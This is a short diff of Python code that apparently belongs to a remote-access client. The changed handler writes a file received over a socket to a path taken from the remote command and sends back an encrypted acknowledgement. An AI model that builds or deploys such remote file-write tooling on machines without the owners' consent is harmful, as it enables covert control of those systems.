@@ -78,7 +78,7 @@ for i in range(1, TIMEOUT):
         elif option == "file-u":
             try:
                 file = s.recv(1024)
-                with open(args.split("|")[1], "wb") as f:
+                with open(data[0], "wb") as f:
                     f.write(file)
                 s.send(encrypt("File Uploaded"))
             except Exception as e:
